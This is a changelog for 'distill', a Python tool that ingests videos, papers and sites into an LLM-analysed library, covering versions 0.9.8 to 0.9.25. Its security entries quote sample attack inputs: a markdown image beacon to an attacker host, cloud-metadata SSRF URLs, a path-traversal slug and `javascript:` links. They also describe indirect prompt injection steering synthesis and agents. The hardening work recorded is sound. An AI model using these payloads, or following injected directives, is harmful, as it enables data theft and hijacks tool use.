**Harden pass: the README's headline command was broken on every invocation, plus the test gap that hid it.** A QA run surfaced that `distill topic create --videos N --papers N` -- the first command in the README -- errored every time, while the full suite was green. Root cause and the wiring-test blind spot are both fixed.

### Fixed / Hardened

- **`topic create` / `topic update` (mixed sources) errored on every run.** These dispatch to the `discover` command by calling it as a plain Python function. Any parameter the caller omitted kept its `typer.Option(...)`/`typer.Argument(...)` sentinel (which is truthy), so `discover`'s own `from_preview`/`from_gaps` guard misfired and aborted with a nonsensical "`--from-preview` can't combine with `--preview`" message -- with no `--from-preview` passed. The same defect silently broke three sibling paths: `topic ... --report` (ran over the entire library with the legacy method), `ramp-up <non-arxiv query> --source paper` (exited on the `papers` sort/rigor guard), and `ramp-up <seed-file>` (leaked `concepts_flag`). New `_invoke_command(fn, **overrides)` helper resolves every omitted parameter to its real default before dispatch; all five internal command-to-command call sites route through it.
- **Closed the wiring-test gap that let it ship.** The test "covering" `topic create` monkeypatched `discover` itself, so the broken dispatch was invisible. New integration test runs the real `topic create -> discover` chain, mocking only the external arxiv/youtube/LLM boundary; it fails if the sentinel leak returns. Added a direct unit test for `_invoke_command` resolving Typer defaults.
- **arXiv feed parser created ghost records.** A malformed/partial Atom entry with no `id` or `title` became a `PaperRecord` with an empty `paper_id` (empty slug, collision risk). Such entries are now skipped.
- **MCP `watch_add` dead branch.** The response built `instructions` via `a or b if a else c`, whose middle branch was unreachable by operator precedence. Simplified to the behavior its test already pins (resolved instructions, else `(none)`).
- **`ramp-up --source` help** listed "auto, youtube, or website" but the command also accepts `paper`; corrected.
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (1935 passed) with branch coverage 81%.

## 0.9.25 - 2026-06-09

**Every ingest entry point is now lens-aware.** 0.9.24 shipped adaptive lenses but only `discover` set the lens; `papers` / `latest` fell back to the neutral default unless a prior `discover` had saved an intent. This closes that gap.

### Added

- **`--lens` on `papers` and `latest`.** Pick the analysis lens directly on the two keyword-driven entry points; the choice persists as the topic's intent (preserving any goal/audience already saved by `discover`), so subsequent ingests inherit it.
- **`distill intent` command group.** `intent set <topic> [--lens --goal --audience --rigor --budget]` configures a topic's `CorpusIntent` once (merging with any existing intent; the lens is inferred from `--goal` when `--lens` is omitted); `intent show <topic>` prints it; `intent clear <topic>` reverts to the neutral default. Because every analyze path already reads the saved intent, setting it once makes all later ingests (CLI + MCP) use the lens, with no re-ingest required.

## 0.9.24 - 2026-06-09

**Adaptive, goal-aware analysis on any topic: the per-source persona is no longer hardcoded. Plus the synthesis thesis rung, provider-error UX, and the completion of the atomic-write pass.** Design: [`docs/design/agentic-distill-master-plan.md`](design/agentic-distill-master-plan.md) and [`docs/design/agentic-deep-synthesis.md`](design/agentic-deep-synthesis.md).

### Added

- **Adaptive analysis lenses (the headline).** Per-source insights were produced with one fixed persona -- a "pre-sales architect advising enterprise customers" baked into the 2-pass video prompt -- so *every* video got `Vendor Watch` / `Business Value Signals` / `Customer Conversation Starters` sections even on a research, physics, or music corpus. Analysis now selects a lens (`research` | `practitioner` | `competitive` | `academic` | `general`) and emits sections that fit the subject matter. The old enterprise framing is the `competitive` lens, preserved exactly; `general` is the neutral default. The lens (and the goal) thread into the video `pass2`, paper, site-page, scan, and shorts prompts. New `distill/prompts/lenses.py`.
- **`CorpusIntent` -- first-class, persisted corpus intent.** A topic's goal, lens, audience, rigor, quality bar, and budget are parsed once into a frozen `CorpusIntent` and persisted at `topics/<topic>/intent.json`. `discover` infers the lens from the goal (or takes `--lens`), saves it, and **every later ingest into that topic inherits the lens automatically** -- videos, papers, and sites, via the CLI and the MCP papers tool. New `distill/library/intent.py`; new `--lens` flag on `discover`.
- **Thesis / white-space synthesis rung.** Cross-paper synthesis and the two-pass corpus synthesis now end with a `## Thesis and White Space` section: the defensible, falsifiable claim the corpus as a whole supports, the unoccupied territory it leaves open, and what evidence would overturn the thesis. This is the top of the Facts -> Patterns -> Insights -> Thesis ladder. Prompt ids bumped (`claims.synthesis.v3`, `synthesis.paper.v3`; analysis prompts to `*.v2`).
- **Opt-in local fallback on credit/auth failure.** Set `DISTILL_FALLBACK_PROVIDER` (+ `DISTILL_FALLBACK_MODEL`, e.g. `ollama` / `qwen3.5:27b`) and a credit-exhaustion / auth failure on the primary cloud provider retries once on the local model instead of aborting the run.

### Fixed / Hardened

- **Clean provider-error messages.** A known operational failure -- credits exhausted, spending limit, bad API key, rate limit -- now prints a one-line message with the next step instead of a raw `openai`/SDK traceback. (Previously an out-of-credits 403 mid-`discover` dumped a full stack trace.) New `distill/llm/errors.py`; rendered at the CLI boundary.
- Completed the atomic durable write pass across the primary corpus paths and critical local state. `write_text_artifact` / `write_markdown_artifact` (every `_Insights.md`, `_Paper.md`, transcript, synthesis, report, brief, local/X ingest) now route through `atomic_write_text` (unique mkstemp + O_EXCL, fsync before replace), as do `Library`/`ChannelState` saves, migration rewrites, and the broken-links fixer. Finishes the durability + pre-placed-symlink resistance work started in 0.9.22.
- Removed leftover one-off migration script `tmp/fix_patches.py`.
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), full test suite green with branch coverage >= 80%.

## 0.9.23 - 2026-06-07

**Third security/robustness pass: CI/CD supply-chain hardening, transport integrity, resource ceilings, and a sweep of parse-don't-crash fixes on untrusted/corruptible local state.**

- **Unpinned GitHub Actions (High, supply chain).** The release (`publish.yml`) and CI workflows referenced actions by mutable tags (`actions/checkout@v6`, `pypa/gh-action-pypi-publish@release/v1`, ...). The publish job holds `id-token: write` for PyPI trusted publishing, so a retagged or compromised action there could mint the OIDC token and ship a malicious release. Every action is now pinned to an immutable commit SHA, including `pypa/gh-action-pypi-publish` after verifying the matching container image tag exists. The pins are bumped manually because this repo deliberately does not run automated dependency update bots.
- **arXiv PDF cleartext fetch (Medium).** `_is_arxiv_pdf_url` accepted `http://` and the URL was fetched as-is; since `requests` does not enforce HSTS, the first hop was plaintext and an on-path attacker could return arbitrary PDF bytes (parsed by pypdf, written to the corpus, fed to the LLM). `http://arxiv.org/...` links and redirect `Location`s are upgraded to `https://` before every request now; the host allow-list still bounds SSRF.
- **Ollama VRAM exhaustion (Medium, DoS).** Adaptive `num_ctx` scaled with prompt length (which includes attacker-influenced scraped text) and was capped only by the model's advertised window. An optional `OLLAMA_MAX_NUM_CTX` ceiling lets an operator bound the KV-cache allocation on a fixed-VRAM box; unset (default) preserves send-it-whole behavior.
- **Two-pass synthesis spend amplification (Medium, DoS).** The MCP-reachable `synthesize(two_pass=true)` path ran one LLM call per insight with no ceiling, so a prompt-injected agent could fan one tool call into thousands of calls. A per-run cap (`DISTILL_CLAIMS_MAX_INSIGHTS`, default 250) bounds it; the remainder defers to the next run via the extracted-sources ledger, so nothing is dropped.
- **Empty concept extractions re-billed (Low).** The concepts pipeline derived "already processed" only from `mentions.jsonl`, which has no row for a valid empty (`[]`) extraction, so those sources were re-extracted (a wasted paid call) on every run. An extracted-sources ledger (mirroring the claims pipeline) makes empty results idempotent.
- **Parse-don't-crash sweep (Low/availability).** A corrupted or hand-edited local JSONL/JSON file (a valid-JSON-but-non-object line, or an ill-typed field) could crash a command with `AttributeError`/`TypeError`. Hardened: cost-log calibration, the `distill eval` cache, `distill health`'s contested-concept scan, the concept mentions reader, the dashboard cost/run-history readers, and the `metadata.json` readers (gap analysis, topic synthesis, dashboard). Frontmatter round-trip now survives a deeply-nested array (`RecursionError`) instead of aborting the artifact write.
- **`--rigor` help corrected.** The flag filters on the rerank `final_score` it is calibrated to, not goal-fit; the help text and a comment said "goal-fit" (the implementation was already correct).
- Branch-coverage floor raised 79 -> 80.

## 0.9.22 - 2026-06-06

**LLM trust-boundary hardening (the prompt-injection half of the second security review) plus durability/perf hygiene.**

- **Indirect prompt injection in second-hop prompts.** The 0.8.7 injection guard only covered the first-hop per-source extraction prompts; the synthesis, report, claim/concept extraction, and rerank prompts -- which combine already-stored, untrusted-derived insights -- had no such frame, so a directive a single poisoned source carried into its insight could steer a corpus-level synthesis, the final report, or candidate ranking. An untrusted-content frame (`DERIVED_CONTENT_RULES`) is threaded into all of them now: channel/topic/site/site-topic/paper-topic/corpus synthesis, dossier/section/deep-research/topic-brief reports, claim and concept extraction + claim synthesis, the three discovery rerank prompts, and the auto-watch-instruction generator (built from untrusted video titles). The local multi-pass analyzer's per-category prompt -- a first-hop prompt that was missing the existing guard -- is fixed too.
- **Atomic-write durability + temp safety.** The concept-rollback and CLAUDE.md writers used a fixed `<name>.tmp` temp file with no fsync -- a predictable name a pre-placed symlink could redirect, and a crash between rename and flush could leave a truncated file. A shared `atomic_write_text` uses a unique `mkstemp` temp (O_EXCL, defeating the symlink redirect), fsyncs before `os.replace`, and cleans up on failure now.
- **Quadratic synthesis assembly.** Channel synthesis built its combined-insights string with repeated `+=` (O(n^2) in corpus size); it accumulates into a list and joins once now, matching the other corpus builders.

The remaining second-review items are accepted as low real-world severity (they need a local attacker with write access to the library, or a hostile/compromised reputable upstream): broad symlink-refusal on every writer, MCP error-text path disclosure, system-temp upload-file location, and the `safe_urlopen` reputable-host read cap. These are documented rather than churned.

## 0.9.21 - 2026-06-06

**Second security review (DoS, prompt-injection, MCP exposure, file-handling). This release fixes the concrete exploitable issues; the LLM-trust-boundary prompt hardening follows in 0.9.22.**

- **SSRF via yt-dlp (High).** `process_video_url` / `watch_add` / `catch_up` passed video/channel URLs straight into yt-dlp, which does its own networking and so bypassed the SSRF guards on the urllib/requests paths -- an attacker URL (`http://169.254.169.254/...`, an internal host) could be fetched. URLs handed to yt-dlp are pinned to YouTube hosts now (`is_youtube_url`), at `get_video_info`, `resolve_channel_name`, and the transcript download.
- **Dashboard exfiltration beacon (High).** Ingested content rendered in the dashboard could carry a markdown image (`![](http://attacker/leak?d=...)`) that survived nh3 and auto-loaded on page view -- a zero-click beacon. The markdown filter drops `<img>`, restricts link schemes to http/https/mailto, and marks links `noopener noreferrer nofollow`; responses also carry a restrictive `Content-Security-Policy` (img-src/default-src 'self') and `Referrer-Policy: no-referrer`.
- **Unbounded local-file ingest (High, DoS).** `ingest` read the whole file into memory before the char cap, and the PDF path walked every page -- a 10 GB file or page-bomb could OOM the process. There's a 25 MB size pre-check, a bounded read (covers FIFO/proc/symlink), and a 50-page PDF cap now (mirroring the arXiv extractor).
- **Unbounded MCP tool spend (Medium, DoS).** The `learn_topic` / `search_videos` / `discover` / `papers` MCP tools had no ceiling on `limit`, so a prompt-injected agent could pass `limit=100000` and drive unbounded transcript downloads + LLM calls. Each is clamped to 25 (matching `site_batch`'s bounded-cost discipline).
- **Syndication decompression bomb (Medium, DoS).** The X syndication fetch used httpx (which auto-decompresses) plus an uncapped `resp.json()`, so a gzip/br bomb from a hostile/compromised endpoint could exhaust memory. The body is streamed and capped at 5 MB of decompressed bytes now.

Confirmed clean or accepted (local-trust): the subprocess/deserialization/secret/ReDoS surface (re-verified), MCP path containment, and the file-handling symlink findings (which require a local attacker with write access to the library -- `_atomic_write` durability/temp hardening is tracked for 0.9.22).

## 0.9.20 - 2026-06-06

**Closed the DNS-rebinding residual documented in the 0.9.19 security pass.**

- **SSRF - DNS-rebinding TOCTOU.** The SSRF guard resolved the host to a public IP, then the HTTP client resolved it *again* to connect, so an attacker controlling DNS with a low TTL could rebind to an internal address between the check and the fetch. The Python fetch paths now pin the connection to the validated IP: `safe_urlopen` and the requests-based attachment download resolve+validate once (`resolve_public_ip`) and pin via `pin_host_to_ip`, while TLS/SNI/certificate verification still use the original host (HTTPS unaffected). The X-video download stays host-pinned to `*.twimg.com` (a rebind would need control of Twitter's DNS); the in-browser scraper (Chromium) is bounded by its public-web route policy rather than IP pinning.

## 0.9.19 - 2026-06-06

**Security hardening pass - a multi-agent audit across SSRF, path traversal, XSS, injection, deserialization, secrets, and ReDoS. Five real issues fixed; the rest of the surface verified clean.**

- **SSRF - X video download (Critical).** `download_video` fetched `video_url` from the (attacker-influenced) tweet syndication response with no validation and `follow_redirects=True`, so a hostile tweet could make distill fetch `http://169.254.169.254/` or an internal host and write the bytes to disk for transcription. It is now pinned to `*.twimg.com` + a public IP, re-validates every redirect hop, and caps the download size.
- **SSRF - `safe_urlopen` redirects (High).** The shared `urllib` fetch validated only the scheme and followed redirects transparently, so a trusted host (arXiv/YouTube) could 30x-redirect to an internal/metadata address. It now rejects any target resolving to a non-public IP and follows redirects only through a handler that re-checks every hop.
- **Path traversal - concept recovery (High).** The `concept_history` / `concept_diff` MCP tools (and the CLI rollback) passed the `slug` argument straight into filesystem joins, so an untrusted agent could read -- and via rollback, write -- `.md` files outside the library (`slug="../../../etc/secret"`). Slugs are validated as a single safe path component at every entry point now.
- **Stored XSS - dashboard channel link (Medium).** `channel_detail.html` put a channel URL into an `href` with no scheme check, so a `javascript:` URL (storable via the `watch_add`/`add_channel` MCP tools) would execute on click. The link is gated to `http(s)` (matching the video page) with `rel="noopener noreferrer"`.
- **Frontmatter injection - site analysis (Low).** An ingested page `<title>` (or other page metadata) containing a newline could inject extra frontmatter fields; page-derived values are JSON-escaped now.

Audited and confirmed clean: command/argument injection (no `shell=True`; yt-dlp via its Python API; hardcoded argv for nvidia-smi/ollama), unsafe deserialization (no `pickle`/`eval`/`yaml.load`; `defusedxml` for arXiv XML), secret leakage (keys are `SecretStr`, never logged or echoed in errors/artifacts/telemetry), ReDoS (no catastrophic patterns), the markdown→HTML→nh3 sanitization order, the loopback-only dashboard bind, and MCP path containment elsewhere (`read_insight`/`read_concept`/`site_batch`). A residual DNS-rebind TOCTOU in the SSRF guard is documented in `net.py` (host-pinned callers unaffected; full closure needs connect-time IP pinning).

## 0.9.18 - 2026-06-06

**Cleared the deferred backlog -- the remaining real bugs from the deep sweeps are now fixed.**

- **Two-pass claim extraction re-ran a zero-claim source on every run.** "Already extracted" was inferred from rows in `claims.jsonl`, but a source that legitimately yields no claims writes no row -- so it was re-extracted (a wasted LLM call) every run, breaking the documented "re-running with no new insights does no LLM calls" guarantee. A per-topic extracted-sources ledger now records every processed insight (including zero-claim ones), so it is skipped next time.
- **`apply_frontmatter` could turn a list field into a quoted scalar.** Patching one frontmatter field on an artifact whose existing `tags`/`authors` weren't re-supplied re-emitted the carried-forward list as `tags: "[a, b]"` instead of `tags: ["a", "b"]`. Inline lists are now parsed back to lists before re-dumping so they round-trip intact (`extract_frontmatter`'s string contract is unchanged -- the fix is local to the merge).
- **The eval pairwise judge could report a position-biased win-rate as "debiased".** When only one of the two orderings produced a parseable verdict, the single-ordering (biased) win-rate was returned despite the design averaging both orderings to cancel A/B position bias. It now requires both orderings; a half-result is treated as no judge signal (the row scores deterministic-only, tentative) rather than a misleadingly "debiased" number.

Also verified and deliberately left unchanged: the providers' `time.sleep` runs under `asyncio.run` as the only coroutine on an ephemeral loop (starves nothing -- the `async` is vestigial, not a bug), and the migration's `write_text` LF→CRLF on Linux-origin files is a cosmetic whitespace effect with no data loss, systemic to every writer.

## 0.9.17 - 2026-06-06

**Third bug-hunt wave (report phases, claims/synthesis, local ingest) plus an adversarial self-review of every prior fix.**

- **Concepts rollback could clobber the wrong note on a slug collision.** Distinct concepts can share a slug (e.g. "gpt 4" and "gpt-4" → `gpt_4`); both the base `<slug>.md` and the bumped `<slug>__2.md` carry the same `slug:` frontmatter, so `distill concepts rollback` restored one concept's snapshot over the other's note. Rollback now refuses when the restored `normalized_name` doesn't match the live note's, instead of silently corrupting it.
- **Single-channel reports silently discarded the gathered synthesis material.** It was stored under the `creator_consensus` id, but single-channel reports write the `creator_accuracy` section, so the lookup missed and the (paid) synthesis was never injected. Stored under both ids now.
- **`_clean_section_output` deleted legitimate "(N words)" parentheticals from report prose.** Two unanchored regexes stripped any `(<number> words)` anywhere in the body (e.g. "short (200 words) and dense"); only the model's trailing self-annotation is stripped now.
- **QA rewrites were silently skipped on title drift.** The QA→fix join matched titles by exact string, so a model echoing "1. Executive Briefing" or "&" vs "and" left a FAILed section un-rewritten. Matching is normalized now, and the FAIL parser resets per header and only honors the section's own `**Score**` line (so a stray "FAIL" in prose can't fail a passed section).
- **`distill resynthesize --style X --two-pass` (and the MCP `synthesize`) silently ignored the register.** `--style` is now threaded into the two-pass claim-synthesis prompt instead of being a no-op.
- **`total_claims` double-counted on `--refresh`.** The append-only `claims.jsonl` re-appends on refresh; the summary now counts distinct `claim_id`.
- **`read_claims` crashed on a non-object JSONL line.** A line that is valid JSON but not an object (`42`, `[1,2]` from a truncated append) raised `TypeError`, violating the documented "one bad line cannot block synthesis" contract; both `read_claims` and `already_extracted_source_ids` now skip such lines.
- **`distill ingest .env` captured a secrets file into the library.** Extensionless dotfiles (config/secret files) are now refused by the local extractor instead of read in via the plain-text route.
- **Providers now fast-fail google-genai 4xx too.** `is_permanent_error` also reads the `.code` attribute (the google-genai exception shape), matching the doctor's auth check, so a permanent Gemini error isn't retried.

An adversarial self-review of all ~25 fixes from 0.9.14-0.9.16 confirmed each is correct with no regressions.

## 0.9.16 - 2026-06-06

**Deep adversarial bug-hunt sweep (max-effort) across frontmatter parsing, cost/eval math, ranking robustness, and doctor false alarms - found by a fan-out of subagents over the deterministic core and the previously shallow-covered subsystems.**

- **Frontmatter was corrupted by any value or body containing `---`.** `extract_frontmatter`/`strip_frontmatter` used `content.split("---", 2)`, which truncated the block at the first `---` *inside a value* (an em-dash-style title, a URL) - dropping every field after it - and mis-stripped a body that opened with a `---` line. Both now use real fence detection (opening line exactly `---`, closing line exactly `---`).
- **A non-finite LLM score silently corrupted rerank ordering.** `json.loads` accepts `NaN`/`Infinity` and `float(nan)` preserves them; a `"final_score": NaN` then broke every rerank `sorted()` (NaN comparisons are all False) and `detect_score_cliff` with no error. `extract_json` now rejects non-finite JSON constants so the caller falls back instead of ranking wrong.
- **`distill eval --threshold > 1.0` crashed with `min([])`.** When no model clears the bar - including the anchor against its own super-unit bar - `summarize` ran `min()` over an empty list. It now recommends nothing (tentatively) instead of crashing after a paid run.
- **Scan/short runs corrupted the calibrated per-video cost (~8x under-projection).** A `scan` pass is ~8x cheaper than a full 2-pass analysis, and Shorts add cost to the numerator without entering the `full_videos` denominator; both polluted the per-video rate, so `discover`'s "calibrated" spend estimate could badly under-project a real ingest. Calibration now uses only pure full-analysis video runs.
- **Deep Research Max could be priced at the standard rate.** `get_pricing`'s prefix match returned the first insertion-order match, so the broad `deep-research` alias could shadow a dated `deep-research-max-*` variant ($2.50 vs $5). Prefix matching is now longest-first, with a `deep-research-max` alias key.
- **`distill discover` crashed on malformed rerank output.** Unlike the video/paper rerankers (which fall back to a heuristic), `discover_rerank` had no guard: a non-dict entry or a null/non-numeric score raised an unhandled traceback. Non-dict entries are skipped at the source, and the call site surfaces a clean error instead of a traceback.
- **`distill topic-watch` undercounted a run's changes.** The run diffed against a `Library` loaded *before* ingestion, so a channel discovered and saved during the run was invisible to that run's change summary/history (self-healed next run). The diff now reads a fresh library.
- **`distill doctor` reported a valid key as "rejected" on transient errors.** Key validation caught every exception as `invalid`, so a valid key during an offline/timeout/rate-limit/5xx moment showed "rejected by provider". Only a real auth rejection (401/403) is now `invalid`; transient failures report a soft `unknown` ("could not verify") that does not read as a dead key.

## 0.9.15 - 2026-06-06

**Second multi-agent bug-hunt sweep - the capture layer (ingestors) and the MCP + web surfaces.**

- **X (Twitter) video tweets produced malformed `Tweet.md`.** A stray filter dropped *every* blank line from the whole document (to remove one optional poster line), collapsing all Markdown paragraph separators so headers and body jammed together - for any tweet with a video. The video block is now built without the document-wide filter.
- **arXiv full-text extraction silently degraded to abstract-only.** `_is_arxiv_pdf_url` required `https`, but arXiv's Atom feed serves pdf links as `http://`, so the download was rejected and `fetch_paper_pdf_text` returned `""` with no error. Both schemes are now accepted; the host allow-list (not the scheme) is what bounds SSRF, and http redirects to https.
- **One corrupt `metadata.json` crashed MCP resources and `research_gaps`.** `video_list` (in `pipeline/gaps.py`) read every video's metadata with an unguarded `json.loads`, so a single truncated file (common after an interrupted run) raised `JSONDecodeError` up through several MCP resources and the `research_gaps` tool. It now skips the bad entry, matching every sibling reader.
- **Path-traversal gap in the web video route.** `GET /topics/{topic}/channels/{channel}/videos/{slug}` appended the raw URL `slug` to a filesystem path with no sanitization, so a percent-encoded `../` could read files outside the channel directory. The slug is now confined under the channel's `videos/` directory (404 on escape), matching the MCP layer's containment.
- **Hardened the dashboard's external video link** to render only for `http(s)` URLs (with `rel="noopener noreferrer"`), so a non-`http` scheme in ingested metadata cannot become a clickable link.

## 0.9.14 - 2026-06-06

**Repaired Gemini Deep Research (broken against google-genai 2.7), hardened `distill doctor`'s API-key checks, and a multi-agent bug-hunt sweep of correctness fixes across the report pipeline, CLI, and LLM providers.**

- **Gemini Deep Research reports/briefings broke against google-genai 2.7 (every `distill report` / `research-brief` / accordion run failed at the final step).** The SDK's experimental Interactions API dropped `Interaction.outputs`; the answer now lives in `steps[].content[].text` (the final `model_output` step's `text` parts). distill read `interaction.outputs[-1].text`, so a completed Deep Research run (the ~$2-3 of work already spent) raised `'Interaction' object has no attribute 'outputs'` and produced nothing. The result extraction and the poll loop are now one parse-once boundary (`distill/pipeline/report/_interactions.py`: `interaction_text` + `await_interaction`) shared by all three report writers, instead of three copy-pasted loops. Found via a real validation run; verified against the installed SDK. This also fixed three latent bugs in the same code:
  - **Poll loop could hang forever.** The real status enum is `in_progress, requires_action, completed, failed, cancelled, incomplete, budget_exceeded`, but the loops only broke on `completed`/`failed` and slept on everything else - so `cancelled`, `incomplete`, and especially `budget_exceeded` (a paid job that blew its budget) polled indefinitely. The loop is now fail-closed: it polls only while the status is in-flight (`in_progress`/`requires_action`) and treats every other status - including any future one the SDK adds - as terminal. It is also bounded (`max_polls`, default 1 hour) so a job that stalls in an in-flight status without ever advancing cannot poll a paid run forever.
  - **Failure messages were always "Unknown error".** `Interaction` has no `error` attribute, so `getattr(interaction, "error", "Unknown error")` discarded the one useful signal. Failures now surface the actual terminal status.
  - **The tests were green while production was broken.** Every report test mocked the obsolete shape (`outputs=[...]`, `status="running"` - not even a real status value), so the suite agreed with dead code rather than the SDK (the same failure class as the typer-0.26 incident). The doubles are rewritten to the real `steps` shape and a dedicated `test_interactions.py` pins the helpers to the full status enum (including a `budget_exceeded` no-hang case) and the legacy-`outputs` fallback for older SDKs.
- **`distill doctor` could report a dead API key as healthy.** The interactive doctor already made a live validation call per key, but the `--json doctor` output and the MCP `doctor` tool checked only *presence* - so a revoked, expired, or wrong-project key showed `set`/`ok` to scripts and agents while every report or analysis using it failed. The two paths disagreeing is the root cause: presence is not health. All three surfaces (human view, `--json`, MCP tool) now share a single live-validation helper (`_doctor_validate_key`) that pings each provider with a minimal request and returns `ok` / `invalid` / `missing` / `not_set`. A present-but-rejected key now reports `invalid` with the provider error and raises a warning, instead of a false-green. The `--json` `checks` values change accordingly (`set` → `ok`/`invalid`); pre-1.0, documented here. Note: `--json doctor` and the MCP `doctor` tool now make minimal live provider calls (as the human doctor always has).
- **File Search stores leaked on error paths.** `run_research_brief` created the remote store (a paid resource) *before* its `try/finally`, so an empty store name or an upload exception returned without deleting it; `create_research_store` likewise leaked its store if gathering/upload/indexing raised, because it ran outside the caller's cleanup. Both now delete the store on every failure path (creation and upload moved under the `try`; `create_research_store` deletes its own store on exception before re-raising). The clean no-content path still defers deletion to the caller.
- **`distill topic preview` (and `topic create --preview`) ingested for real when `--papers 0`.** The videos-only branch called the full learning workflow (transcripts, analysis, synthesis - real spend) *before* the "preview only" notice, because `_run_learning_command` has no dry-run path. Videos-only preview now routes to `_preview_learning_selection` like `distill latest --preview`, so a preview never spends.
- **CLI numeric edge cases.** `distill costs --last 0` showed *every* run (`entries[-0:]` is the whole list) instead of none - now bounded explicitly. `--months 0` was swallowed by `months or default` (months defaults to `None`, so `0` is a real value) and silently used the config default - now distinguishes unset (`None`) from an explicit `0`. The `channel` help text claimed "default: 3" while the real default is 1.
- **`distill latest` / learning flow could crash on tz-aware upload dates.** `_filter_recent_candidates` compared a tz-aware `published_at` (YouTube returns RFC3339 with `Z`/offset) against a naive cutoff, raising `TypeError: can't compare offset-naive and offset-aware`. Aware timestamps are now normalized to naive local before the comparison.
- **LLM providers retried permanent (4xx) errors.** Grok, Gemini, LM Studio, and Ollama each wrapped their call in an `except Exception` retry loop that backed off and retried *every* error - including 400/401/403/404/422, which can never succeed (a bad key burned ~15s of backoff per call). They now short-circuit on permanent statuses via a shared `is_permanent_error` helper (the `PERMANENT_ERRORS` set already shipped in `retry.py` but was unused); unknown error shapes still fall back to retrying.
- **Security: bumped `pip` 26.1.1 → 26.1.2 in the locked dev toolchain** (PYSEC-2026-196) so the `pip-audit` CI gate stays green; the transitive pin (via `pip-api` → `pip-audit`) had floated to the vulnerable release.

## 0.9.13 - 2026-06-01

**Two install-time correctness fixes found by running a real pip install.**

- **`distill doctor` reported `Version: vdev`.** Version detection queried `importlib.metadata.version("distill")`, but the published distribution is named **`distillr`** - so the lookup always raised `PackageNotFoundError` and fell back to `"dev"`. It now queries `distillr` (with a `distill` fallback) and guards against malformed metadata, so doctor shows the real installed version. Same fix applied to the web dashboard footer.
- **The library no longer defaults inside `site-packages`.** `_default_library_dir()` returned `<package>/../library`, which in a pip install resolves to `.../site-packages/library` - user corpus data written there is wiped on every reinstall/upgrade and can need admin write. It now detects a source checkout (a `pyproject.toml` one level up → keep the convenient `<repo>/library` for development) versus an installed package (→ default to `~/.distill/library`, a stable per-user location). Override with `DISTILL_OUTPUT_DIR` as before.

## 0.9.12 - 2026-06-01

**Local-first onboarding: `distill eval` works keyless, and `distill doctor` tells you what to run next.**

A user who downloads distill, wants to run local, and has no cloud key should be able to eval without fuss - not hit "XAI_API_KEY required." Two changes make the adaptive path real:

- **Adaptive `auto` defaults in `distill eval`.** `--models`, `--anchor`, and `--judge` now default to `auto`. With an `XAI_API_KEY` present, `auto` resolves to `grok-4.3` (the cloud reference). With **no** cloud key, `auto` resolves to a fitting local model via `_best_local_model()` (largest Ollama model that fits detected VRAM), and the anchor falls back to the first listed model - so a local-only user can run `distill eval --models qwen3.5:27b,gemma4:26b` with no key and no flags. The judge likewise picks a local model rather than erroring on a missing key.
- **`distill doctor` next-step line.** Doctor now ends with a concrete first command tailored to detected state: cloud-ready boxes get a `distill papers` example (plus a local-vs-cloud `distill eval` compare when Ollama models are present); a keyless box with local models gets the keyless `distill eval` command; a bare box gets the two ways to get started (set `XAI_API_KEY`, or `ollama pull`). No more guessing what to type after the health report.

## 0.9.11 - 2026-06-01

**Portability: cross-platform hardware detection + local is clearly optional.**

- **Windows RAM detection.** `_get_system_ram()` only handled macOS/Linux, so `distill doctor` reported "RAM: 0 GB" on Windows. Added a `ctypes` `GlobalMemoryStatusEx` probe (no new deps).
- **Graceful on non-NVIDIA / no-GPU machines.** The eval's VRAM-fit guard already covers NVIDIA (`nvidia-smi`) and Apple Silicon (unified memory). On AMD/Intel/CPU-only or any box where VRAM can't be probed, it no longer goes silent - it notes "local models will run on CPU (slow); cloud models are unaffected" instead of blocking. Cloud models are never gated by the local-hardware check.
- **Local is optional, documented.** The eval (and the whole pipeline) runs cloud-only on any OS with no Ollama installed; local models are an opt-in cost lever. Spelled out in `docs/usage.md`.

## 0.9.10 - 2026-06-01

**Honest workload label for `--workload all`.** The summary table took its label from the first fixture, so an all-workloads run (paper+video+site pooled) was mislabeled "paper." It now reads `all (paper+site+video)` when the rows span multiple workloads, and keeps the single workload's name otherwise. Found running the first full-coverage validation.

## 0.9.9 - 2026-06-01

**GPU-adaptive local inference + a working neutral judge (all found via real eval runs).** Driving `distill eval` against actual local models and a cross-vendor judge surfaced a chain of integration bugs that unit tests can't see; each is fixed and tested. End state: a free local model (gemma4:26b) validated as competitive with grok-4.3 on the paper workload under a neutral gemini judge (win-rate 0.58), all on a 24 GB GPU.

- **Adaptive context sizing (root-cause GPU fix).** The Ollama provider never set `num_ctx`, so a model with a huge default context (qwen3.6:27b → 262144) allocated a matching KV cache and spilled VRAM to CPU - 44 GB / 50% CPU even for a 200-word prompt. It now sizes `num_ctx` to the actual prompt (+ headroom), capped at the model's max: that same model now loads at **23 GB / 88% GPU** and runs. Helps *all* local inference, not just eval.
- **VRAM-aware eval.** `distill eval` detects GPU VRAM and **skips local models whose weights exceed it** (they'd spill to CPU), with `--allow-oversized` to force. Analysis is processed **model-outer** so a local model stays loaded across its fixtures instead of thrashing in/out of VRAM every call.
- **Judge provider routing.** A non-xAI judge (e.g. gemini) was sent to the xAI endpoint (`Model not found`). The judge now routes to its model's own provider. Added `reasoning_effort` to the Gemini/Anthropic/OpenAI provider signatures for interface parity (the judge was the first non-xAI chat call through the router), and raised the judge token cap so thinking models (Gemini 3.x) don't truncate their JSON verdict.
- **Honest confidence + no cache poisoning.** When the judge produces no signal (unavailable/failed), a deterministic-only recommendation is now `tentative`, not a false "high - judge agrees." Failed judge verdicts are no longer cached (a transient failure was frozen in and reused on every rerun).

## 0.9.8 - 2026-06-01

**`distill eval` hardened from real cloud+local validation runs.** A first real run (grok-4.3 vs a local Ollama model, < $0.05 total) surfaced two bugs that only show up against live providers; both are fixed and tested.

- **Fault isolation.** A single slow/failed call (a local model's cold-load timing out) crashed the entire sweep. Now each `(model, fixture)` is isolated: a failure is logged, the row is flagged `error` (excluded from scoring but counted), and the run still completes with a table. Added `timeout=600` for local cold-loads, and graceful pairwise-judge failure. If the anchor itself fails everywhere, the run reports "no valid output" instead of recommending.
- **Local inference is now correctly free.** The cost registry was pricing local models (e.g. `qwen3.5:27b`) at the grok-4.3 fallback rate - erasing the entire cost advantage of running local. Local-provider analysis is now **$0** in both the pre-run estimate and the per-row cost (and kept off the run's cost ledger).
